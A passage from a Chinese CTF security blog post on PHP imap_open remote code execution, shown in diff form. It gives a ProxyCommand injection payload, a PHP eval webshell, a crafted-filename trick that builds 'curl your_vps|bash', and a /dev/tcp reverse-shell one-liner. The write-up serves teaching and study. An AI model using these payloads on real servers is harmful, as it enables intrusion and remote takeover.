+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$server = <span class="string">"any -o ProxyCommand=bash\t1.jpg"</span>;@imap_open(<span class="string">'&#123;'</span>.$server.<span class="string">'&#125;:143/imap&#125;INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></figure>
+
+<p>1.jpg内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo&quot;&lt;?php @eval($_POST[&#39;li&#39;]);?&gt;&quot;&gt;webshell.php</span><br></pre></td></tr></table></figure>
+
+<p>回显结果：</p>
+<p><img src="https://ask.qcloudimg.com/http-save/5426480/vcfnmspuo2.jpeg?imageView2/2/w/1620" alt="img"></p>
+<p>成功的打出webshell.</p>
+<p><strong>另一个思考：</strong></p>
+<p>如果这道题没有上传文件的助攻该怎么办？</p>
+<p>其实在上面我们可以看见，这个是有建立文件的功能的，所以我们可以根据hitcon的一道题的思路：</p>
+<p>先建立我们所需要的文件名，比如文件名最后需要的是 <code>curl your_vps|bash</code>，在文件的index.html中写入反弹bash的一句话：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp/vps/port <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>通过建立如下文件名</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'\&gt;sh\ '</span></span><br><span class="line"><span class="string">'&gt;ba\\\\\'</span></span><br><span class="line"><span class="string">'</span>&gt;\\\|\\\\<span class="string">'</span></span><br><span class="line"><span class="string">中间省略一些建立ip的过程</span></span><br><span class="line"><span class="string">'</span>&gt;rl\\\\<span class="string">'</span></span><br><span class="line"><span class="string">'</span>&gt;cu\\\\<span class="string">'</span></span><br></pre></td></tr></table></figure>
+
+<p>最后通过命令ls -t&gt;g将文件名导入g中，执行命令sh g，最终反弹shell。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/06/01/ISCC2019%E9%83%A8%E5%88%86wp/" rel="next" title="ISCC2019部分wp">
+                <i class="fa fa-chevron-left"></i> ISCC2019部分wp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/06/01/%E7%94%B1%E4%B8%80%E9%81%93%E9%A2%98%E5%BC%95%E5%8F%91%E5%AF%B9CTF%E6%80%9D%E7%BB%B4%E7%9A%84%E6%80%9D%E8%80%83/" rel="prev" title="由一道题引发对CTF思维的思考">
+                由一道题引发对CTF思维的思考 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">离怀秋</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">72</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/lihuaiqiu" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://southseast.cc" title="南溟师傅" target="_blank">南溟师傅</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-mail-函数介绍"><span class="nav-number">1.</span> <span class="nav-text">PHP mail()函数介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-mail-函数利用姿势"><span class="nav-number">2.</span> <span class="nav-text">PHP mail()函数利用姿势</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2016-10033分析"><span class="nav-number">3.</span> <span class="nav-text">CVE-2016-10033分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Bypass-pcre8"><span class="nav-number">4.</span> <span class="nav-text">Bypass pcre8</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE-2016-10045分析"><span class="nav-number">4.0.1.</span> <span class="nav-text">CVE-2016-10045分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#escapeshellcmd与escapeshellarg导致参数注入"><span class="nav-number">5.</span> <span class="nav-text">escapeshellcmd与escapeshellarg导致参数注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#imap-open-RCE-分析"><span class="nav-number">6.</span> <span class="nav-text">imap_open RCE 分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#IMAP介绍"><span class="nav-number">6.1.</span> <span class="nav-text">IMAP介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞主要触发原理"><span class="nav-number">6.2.</span> <span class="nav-text">漏洞主要触发原理:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#docker中模拟测试"><span class="nav-number">6.3.</span> <span class="nav-text">docker中模拟测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bypass-disable-functions"><span class="nav-number">6.4.</span> <span class="nav-text">Bypass disable_functions</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安恒二月赛场景分析"><span class="nav-number">6.5.</span> <span class="nav-text">安恒二月赛场景分析</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">离怀秋</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count"></span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
